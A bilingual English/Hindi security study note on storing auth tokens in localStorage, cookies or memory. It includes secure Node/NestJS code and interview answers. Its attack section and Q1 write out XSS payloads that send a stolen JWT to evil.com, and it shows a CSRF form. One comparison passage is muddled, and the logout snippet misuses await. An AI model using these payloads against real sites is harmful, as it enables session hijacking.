---

# 103. Token Storage Security — localStorage vs httpOnly Cookie vs Memory
# हिंदी में: Token कहाँ Store करें — Security Comparison
# Risk Level: ⛔ High

---

## 🔵 Simple Definition (English)
Where you store authentication tokens (JWT, session tokens) determines which attacks can steal them. The three options are localStorage/sessionStorage (accessible to JavaScript), httpOnly cookies (inaccessible to JavaScript, sent automatically with requests), and in-memory (lost on refresh, most secure for SPA). There is no perfect option — each trades off between XSS risk and CSRF risk.

## 🔵 सरल परिभाषा (Hindi)
Authentication token कहाँ store करते हो यह decide करता है कि कौन सा attack उसे चुरा सकता है। localStorage = JavaScript access करे → XSS steal कर सकता है। httpOnly cookie = JavaScript access नहीं → XSS नहीं चुरा सकता लेकिन CSRF possible। Memory = सबसे safe लेकिन page refresh पर खो जाता है।

---

## ⚠️ The Attack / Threat

```
STORAGE OPTIONS COMPARISON:

┌─────────────────┬──────────────┬─────────────────┬─────────────────┐
│ Storage         │ XSS Risk     │ CSRF Risk       │ Persistence     │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ localStorage    │ ⛔ HIGH      │ ✅ Low (manual  │ Survives refresh│
│                 │ JS readable  │ header needed)  │ + tab close     │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ sessionStorage  │ ⛔ HIGH      │ ✅ Low          │ Tab only        │
│                 │ JS readable  │                 │ (lost on close) │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ httpOnly Cookie │ ✅ Low       │ ⚠️ Medium      │ Configurable    │
│                 │ JS can't read│ (auto-sent)     │ (maxAge/session)│
│                 │              │ Mitigate:       │                 │
│                 │              │ SameSite=Strict │                 │
├─────────────────┼──────────────┼─────────────────┼─────────────────┤
│ Memory (JS var) │ ✅ Low       │ ✅ Low          │ ⚠️ Page refresh │
│                 │ Not in DOM   │ (manual header) │ loses token     │
└─────────────────┴──────────────┴─────────────────┴─────────────────┘

ATTACK SCENARIO — localStorage + XSS:
Attacker injects: <script>fetch('https://evil.com?t='+localStorage.getItem('jwt'))</script>
→ victim's JWT sent to attacker → impersonation until token expires

ATTACK SCENARIO — httpOnly Cookie + CSRF:
<form action="https://app.com/transfer" method="POST" hidden>...</form>
→ browser auto-sends cookie → CSRF succeeds
(Mitigated by SameSite=Strict — browser refuses to send cookie cross-origin)

localStorage vs Cookie CSRF:
localStorage: attacker CANNOT read the token, but also cannot make requests
  using it without JS (must manually set Authorization header)
  → Cross-origin fetch() without custom headers would work but:
    - fetch('https://app.com/delete', {credentials: 'omit'}) — no cookie sent
    - But attacker can still do img src / form submit with cookies!
```

---

## 💻 Vulnerable Code (What NOT to do)

```javascript
// ❌ VULNERABLE STORAGE PATTERNS

// ─── localStorage for JWT ─────────────────────────────────────
// After login:
localStorage.setItem('accessToken', response.data.accessToken);
localStorage.setItem('refreshToken', response.data.refreshToken);

// Every request:
const token = localStorage.getItem('accessToken');
axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;

// ❌ Problem: ANY JavaScript on the page can read localStorage
// XSS payload: document.createElement('img').src='https://evil.com?t='+localStorage.getItem('accessToken')
// → attacker gets your JWT

// ─── Cookie without SameSite or HttpOnly ─────────────────────
// Server:
res.cookie('token', jwt, {
  // ❌ No httpOnly — JS can read it: document.cookie
  // ❌ No SameSite — sent cross-origin
  // ❌ No Secure — sent over HTTP
  maxAge: 7 * 24 * 60 * 60 * 1000
});

// ─── Storing sensitive data in JWT payload ────────────────────
const token = jwt.sign({
  userId: 1,
  email: 'user@example.com',
  // ❌ These are visible to anyone who base64-decodes the token:
  password: hashedPassword,   // ❌ NEVER
  creditCard: '4111...',      // ❌ NEVER
  ssn: '123-45-6789'         // ❌ NEVER
}, secret);
// JWT payload is NOT encrypted — anyone can decode it!
```

---

## 💻 Secure Code (What TO do)

```javascript
// ✅ SECURE STORAGE PATTERNS

// ─── Option 1: httpOnly Cookie (Recommended for most apps) ────
// Server sets httpOnly cookie after login:
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await validateUser(email, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const accessToken = generateAccessToken(user.id, user.role);
  const refreshToken = generateRefreshToken(user.id);

  // ✅ httpOnly: not accessible to JS (XSS-safe)
  // ✅ Secure: only sent over HTTPS
  // ✅ SameSite: 'strict' prevents CSRF
  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,  // 15 minutes
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/auth/refresh',   // ✅ only sent to this endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days
  });

  // Send user info (without tokens) to client for UI state
  res.json({ userId: user.id, name: user.name, role: user.role });
});

// Client reads cookie automatically — no JavaScript needed:
// axios.get('/api/data')  → browser sends accessToken cookie automatically

// ─── Option 2: In-Memory for SPA (Highest Security, UX Tradeoff) ─
// React context / Zustand store:
let accessToken = null;  // module-level variable (not localStorage)

export function setAccessToken(token) {
  accessToken = token;
}

export function getAccessToken() {
  return accessToken;
}

// On login:
const { accessToken } = await login(credentials);
setAccessToken(accessToken);  // in memory — XSS cannot access module scope easily

// Axios interceptor:
axios.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// On page refresh: token lost → use silent refresh with httpOnly refresh cookie:
async function silentRefresh() {
  try {
    const { data } = await axios.post('/auth/refresh', {}, { withCredentials: true });
    // refresh token is in httpOnly cookie → sent automatically
    setAccessToken(data.accessToken);  // new access token in memory
    return true;
  } catch {
    return false;  // not logged in → redirect to login
  }
}

// Run on app startup:
useEffect(() => {
  silentRefresh();
}, []);

// ─── HYBRID APPROACH (Best Practice for SPA) ──────────────────
// Access token: in-memory (lost on refresh)
// Refresh token: httpOnly cookie (persists, used for silent refresh)
// Result:
//   - XSS cannot steal access token (in memory) or refresh token (httpOnly)
//   - CSRF cannot use refresh token (SameSite=Strict, path restricted)
//   - Page refresh: silent refresh gets new access token from httpOnly refresh cookie

// ─── Logout: Clear Both ───────────────────────────────────────
app.post('/auth/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (refreshToken) {
    // Revoke in database/Redis
    await revokeToken(refreshToken);
  }
  
  // Clear cookies server-side:
  res.clearCookie('accessToken', { path: '/' });
  res.clearCookie('refreshToken', { path: '/auth/refresh' });
  
  res.json({ message: 'Logged out' });
});

// Client also clears in-memory token:
function logout() {
  setAccessToken(null);  // clear memory
  await axios.post('/auth/logout');
  window.location.href = '/login';
}

// ─── What NOT to include in JWT payload ──────────────────────
// JWT payload is base64 encoded — NOT encrypted. Anyone can decode it.
// ✅ INCLUDE: userId, role, exp, iss — non-sensitive identifiers
// ❌ NEVER INCLUDE: passwords, SSN, card numbers, secrets

// If you need encryption: use JWE (JSON Web Encryption) instead of JWT
// or store sensitive data server-side and only reference it by ID in JWT
```

---

## 🟠 Implementation in My Stack

```typescript
// ─── NestJS — Cookie-based auth ──────────────────────────────
// auth.controller.ts
@Post('login')
async login(@Body() dto: LoginDto, @Res({ passthrough: true }) res: Response) {
  const { accessToken, refreshToken } = await this.authService.login(dto);

  res.cookie('accessToken', accessToken, {
    httpOnly: true,
    secure: this.configService.get('NODE_ENV') === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,
  });

  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: this.configService.get('NODE_ENV') === 'production',
    sameSite: 'strict',
    path: '/auth/refresh',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  return { message: 'Login successful' };
}

// ─── Next.js — Token handling ─────────────────────────────────
// pages/api/auth/login.ts (Next.js API route)
export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { email, password } = req.body;
  const tokens = await authenticate(email, password);
  
  // Next.js: set-cookie via response headers
  res.setHeader('Set-Cookie', [
    `accessToken=${tokens.accessToken}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=900`,
    `refreshToken=${tokens.refreshToken}; Path=/api/auth/refresh; HttpOnly; Secure; SameSite=Strict; Max-Age=604800`,
  ]);
  
  res.json({ success: true });
}
```

---

## 🔧 Storage Security Summary
| Storage | XSS | CSRF | Refresh | Best For |
|---------|-----|------|---------|----------|
| `localStorage` | ❌ Stolen | ✅ Safe | ✅ Survives | Small non-sensitive data only |
| `sessionStorage` | ❌ Stolen | ✅ Safe | ❌ Lost | Temporary session state |
| `httpOnly cookie` | ✅ Safe | ⚠️ Need SameSite | ✅ Configurable | Auth tokens (recommended) |
| Memory | ✅ Safe | ✅ Safe | ❌ Lost on refresh | Access token in SPA |
| Hybrid (memory + httpOnly refresh) | ✅ Safe | ✅ Safe | ✅ Silent refresh | Best SPA approach |

---

## ⚫ Interview Questions + Answers

**Q1: Why is localStorage considered insecure for JWTs?**
A1: Any JavaScript running on the page can read localStorage — including malicious scripts injected via XSS. `document.createElement('img').src='evil.com?t='+localStorage.token` — done. The attack doesn't require user interaction and the attacker gets a persistent token they can use until it expires. By contrast, httpOnly cookies can't be read by JavaScript at all — XSS can make requests using those cookies but can't exfiltrate the token value itself, making it harder to use the token from an attacker-controlled server.

**Q2: If httpOnly cookies prevent XSS token theft, why don't all apps use them?**
A2: Three practical reasons: (1) **CORS complexity** — cookies require `credentials: 'include'` in fetch + `Access-Control-Allow-Credentials: true` on server, can't use `*` for origin. (2) **CSRF risk** — cookies are sent automatically with cross-origin requests (mitigated by SameSite=Strict but may break OAuth flows). (3) **Mobile apps** — native mobile apps don't use browser cookies; they need tokens in response bodies to store in secure device storage (iOS Keychain, Android Keystore). SPA + web → httpOnly cookie recommended. Mobile app → secure device storage + token in response body.

**Q3: What is the hybrid approach and why is it the most secure?**
A3: Hybrid stores access tokens in JavaScript memory (a module variable, not localStorage) and refresh tokens in httpOnly cookies. Access token in memory: XSS can't read it (not in DOM storage), CSRF doesn't apply (must manually set Authorization header). On page refresh: access token is lost, but silent refresh uses the httpOnly refresh cookie to get a new one. Refresh token in httpOnly cookie with SameSite=Strict: XSS can't steal it, CSRF can't use it (SameSite blocks cross-origin requests). This gives you XSS safety + CSRF safety + persistence across page refreshes.

**Q4: What data should and should NOT be in a JWT payload?**
A4: JWT payload is base64url encoded — NOT encrypted. Anyone with the token (users, browser devtools, logs, proxies) can decode it and read the payload. Include: `userId`, `role`, `exp`, `iss`, `aud` — identifiers and auth claims that are non-sensitive. Never include: passwords (even hashed), credit card numbers, SSN, secrets, private PII beyond what the frontend genuinely needs. If you need to pass sensitive data: use JWE (JSON Web Encryption) which encrypts the payload, or store sensitive data server-side and reference it by a non-guessable ID in the JWT.

**Q5: How do you handle token refresh without storing the refresh token in localStorage?**
A5: Hybrid pattern: store refresh token in httpOnly cookie (path restricted to `/auth/refresh`). When access token expires (401 response), interceptor sends a request to `/auth/refresh` — the browser automatically attaches the httpOnly refresh cookie. Server verifies, rotates (revokes old, issues new), and sets new httpOnly cookies. For the initial page load / app startup, call the refresh endpoint once to get an access token into memory. Client never sees or stores the refresh token value — it's purely server-side and in the browser's cookie jar (not in JS land). This is the approach used by major SPAs including Facebook and Google.

---

## ✅ Security Checklist
```
□ No JWTs or session tokens in localStorage (XSS risk)
□ Auth cookies have HttpOnly attribute
□ Auth cookies have Secure attribute (HTTPS only)
□ Auth cookies have SameSite=Strict or Lax
□ Refresh token cookie has restricted path (/auth/refresh only)
□ Access tokens short-lived (15 min)
□ SPA uses in-memory + httpOnly refresh cookie (hybrid approach)
□ No sensitive data (passwords, cards) in JWT payload
□ Token revocation implemented (logout actually invalidates tokens)
□ Silent refresh implemented for in-memory access tokens
□ Logout clears cookies server-side + client-side memory
```

---

## 📊 Visual Diagram

```
ATTACK SURFACE COMPARISON:

localStorage:
[JS Code] → localStorage.getItem('jwt') → READABLE
XSS script → reads token → sends to evil.com → STOLEN ☠️

httpOnly Cookie:
[JS Code] → document.cookie → "accessToken" NOT VISIBLE ✅
XSS script → cannot read → cannot steal ✅
CSRF: evil.com → POST /transfer → browser sends cookie automatically
  → mitigated by SameSite=Strict (browser refuses)

Memory:
[JS Code] → module variable → readable by code in same module
XSS injected script → different module/scope → cannot access ✅
No persistence → page refresh = lost → silent refresh from httpOnly cookie

HYBRID FLOW:
Page Load → silentRefresh() → POST /auth/refresh (sends httpOnly cookie)
→ Server verifies refresh token → issues new access token
→ Store in memory only → use for API calls (Authorization: Bearer)
→ 15 min later: 401 → interceptor calls silentRefresh() again
```

---

## 📝 Key Terms (English + Hindi)
| Term | Meaning | Hindi |
|------|---------|-------|
| httpOnly | Cookie not readable by JS | JS से cookie hide रहती है |
| SameSite=Strict | Cookie not sent cross-origin | दूसरी site पर cookie नहीं जाती |
| Silent Refresh | Auto-get new token using refresh cookie | Background में automatically नया token लेना |
| Hybrid Approach | Memory access + httpOnly refresh | Memory + httpOnly cookie combination |
| JWE | JWT with encrypted payload | Encrypted JWT payload |
| Secure flag | Cookie only over HTTPS | HTTP पर cookie नहीं जाती |

---

## ⚡ 3-Line Summary
**English:**
1. localStorage = XSS can steal tokens; httpOnly cookies = XSS-safe but CSRF-risk; memory = most secure but lost on refresh.
2. Best practice: hybrid — access token in memory, refresh token in httpOnly cookie with SameSite=Strict and restricted path.
3. JWT payload is base64 not encrypted — never store passwords, card numbers, or secrets in it.

**Hindi:**
1. localStorage में XSS चुरा सकता है; httpOnly cookie में XSS नहीं चुरा सकता लेकिन CSRF possible; memory सबसे safe लेकिन refresh पर खो जाता है।
2. Best: access token memory में, refresh token httpOnly cookie में SameSite=Strict के साथ।
3. JWT payload base64 है, encrypted नहीं — passwords, cards, secrets कभी मत डालो।

---

## 🚨 Red Flag Signs
- `localStorage.setItem('token', jwt)` in frontend code
- `document.cookie = 'session=...'` without HttpOnly (via JS)
- Cookie without SameSite attribute
- Refresh token returned in JSON response body (instead of httpOnly cookie)
- `jwt.decode()` used instead of `jwt.verify()` anywhere
- Same CORS policy for public and authenticated endpoints
- `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` (browsers reject this anyway)

---

## ➡️ Next Topic
**163. Helmet.js** — Complete guide to security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and how Helmet.js configures them all.
